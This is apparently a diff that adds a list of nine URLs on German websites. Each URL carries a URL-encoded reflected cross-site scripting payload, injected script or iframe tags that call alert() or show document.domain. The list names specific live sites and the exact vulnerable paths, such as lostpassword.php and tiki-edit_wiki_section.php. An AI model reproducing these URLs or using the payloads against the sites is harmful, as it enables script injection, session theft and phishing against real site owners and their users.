@@ -1,0 +1,9 @@
+http://gehort.immeta.de/tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(31337)%3C/script%3E
+http://getacs.de/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://getraenke-team.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://globaltherm.de/pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%281337%29%22%3E.vm
+http://gofair.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://grundbesitz.immeta.de/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://gut-ziel-geiselbullach.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+https://gehrden-suche.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://grossenhain-zone.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
